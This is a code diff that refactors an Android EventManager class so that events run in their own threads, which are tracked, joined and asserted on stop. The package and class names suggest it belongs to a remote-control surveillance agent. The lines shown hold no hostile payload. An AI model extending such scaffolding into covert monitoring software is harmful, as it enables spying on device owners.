@@ -13,29 +13,33 @@ import java.util.Map;
 
 import android.util.Log;
 
+import com.ht.RCSAndroidGUI.Manager;
 import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.agent.AgentBase;
+import com.ht.RCSAndroidGUI.utils.Check;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class EventManager.
  */
-public class EventManager {
-	
+public class EventManager extends Manager {
+
 	/** The Constant TAG. */
 	private static final String TAG = "EventManager";
 
 	/** The singleton. */
 	private volatile static EventManager singleton;
-	
+
 	/** The status obj. */
 	private final Status statusObj;
 
 	/** The running. */
 	private final HashMap<Integer, EventBase> running;
+	private HashMap<EventBase, Thread> threads;
 
 	/**
 	 * Self.
-	 *
+	 * 
 	 * @return the event manager
 	 */
 	public static EventManager self() {
@@ -57,6 +61,7 @@ public class EventManager {
 		statusObj = Status.self();
 
 		running = new HashMap<Integer, EventBase>();
+		threads = new HashMap<EventBase, Thread>();
 	}
 
 	/**
@@ -138,7 +143,7 @@ public class EventManager {
 
 	/**
 	 * Start events.
-	 *
+	 * 
 	 * @return true, if successful
 	 */
 	public boolean startEvents() {
@@ -156,7 +161,6 @@ public class EventManager {
 			return false;
 		}
 
-		// TODO BAU (basta una lista di Event)
 		final Iterator<Map.Entry<Integer, Event>> it = events.entrySet()
 				.iterator();
 
@@ -166,8 +170,16 @@ public class EventManager {
 			final EventBase e = mapEvent(key);
 
 			if (e != null) {
+
 				e.parse(pairs.getValue());
-				e.start();
+				if (e.getStatus() != Event.EVENT_RUNNING) {
+					Thread t = new Thread(e);
+					t.start();
+					threads.put(e, t);
+
+				} else {
+					Log.w(TAG, "event already running");
+				}
 			}
 		}
 
@@ -184,12 +196,28 @@ public class EventManager {
 
 		while (it.hasNext()) {
 			final Map.Entry<Integer, EventBase> pairs = it.next();
+			EventBase event = pairs.getValue();
 
-			if (pairs.getValue().getStatus() != Event.EVENT_RUNNING) {
-				continue;
+			Log.d(TAG, "Stopping: " + event);
+
+			if (event.getStatus() == Event.EVENT_RUNNING) {
+				event.stopThread();
+				try {
+					Thread t = threads.get(event);
+					Check.asserts(t != null, "Null thread");
+
+					t.join();
+					threads.remove(event);
+
+				} catch (InterruptedException e) {
+					e.printStackTrace();
+					Log.e(TAG, e.toString());
+				}
+			} else {
+				Check.asserts(threads.get(event) == null,
+						"Shouldn't find a thread");
 			}
 
-			pairs.getValue().stopThread();
 		}
 	}
 }
